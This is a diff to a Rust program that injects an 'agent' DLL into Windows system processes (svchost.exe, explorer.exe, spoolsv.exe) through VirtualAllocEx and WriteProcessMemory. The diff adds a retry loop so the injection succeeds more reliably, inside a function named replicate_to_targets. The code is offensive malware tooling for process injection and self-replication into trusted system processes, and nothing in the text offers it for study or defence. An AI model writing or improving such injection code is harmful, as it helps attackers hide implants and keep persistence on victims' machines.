@@ -9,6 +9,8 @@ use crate::Log;
 use std::collections::HashSet;
 use std::ffi::{c_void, CStr, CString};
 use std::mem;
+use std::thread;
+use std::time::Duration;
 use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
 use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
 use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
@@ -113,6 +115,28 @@ fn inject_dll(pid: u32, dll_path: &str) -> Result<(), String> {
     }
 }
 
+/// Injects a DLL into a target process with a retry mechanism.
+fn inject_with_retry(pid: u32, dll_path: &str, retries: u32, delay: Duration) -> Result<(), String> {
+    let mut last_error = String::new();
+    for attempt in 0..retries {
+        match inject_dll(pid, dll_path) {
+            Ok(_) => return Ok(()),
+            Err(e) => {
+                last_error = e;
+                Log::info(format!(
+                    "Injection attempt {}/{} failed for PID: {}. Retrying in {:?}...",
+                    attempt + 1,
+                    retries,
+                    pid,
+                    delay
+                ));
+                thread::sleep(delay);
+            }
+        }
+    }
+    Err(last_error)
+}
+
 /// Identifies target processes and injects the agent DLL into them.
 pub fn replicate_to_targets() -> usize {
     const TARGET_PROCESSES: &[&str] = &["svchost.exe", "explorer.exe", "spoolsv.exe"];
@@ -157,7 +181,10 @@ pub fn replicate_to_targets() -> usize {
             if injected_pids.contains(&pid) {
                 continue; // Already injected into this process
             }
-            match inject_dll(pid, dll_path_str) {
+            const MAX_RETRIES: u32 = 3;
+            const RETRY_DELAY: Duration = Duration::from_millis(100);
+
+            match inject_with_retry(pid, dll_path_str, MAX_RETRIES, RETRY_DELAY) {
                 Ok(_) => {
                     Log::info(format!("Successfully injected agent into {} (PID: {})", process_name, pid));
                     injected_pids.insert(pid);
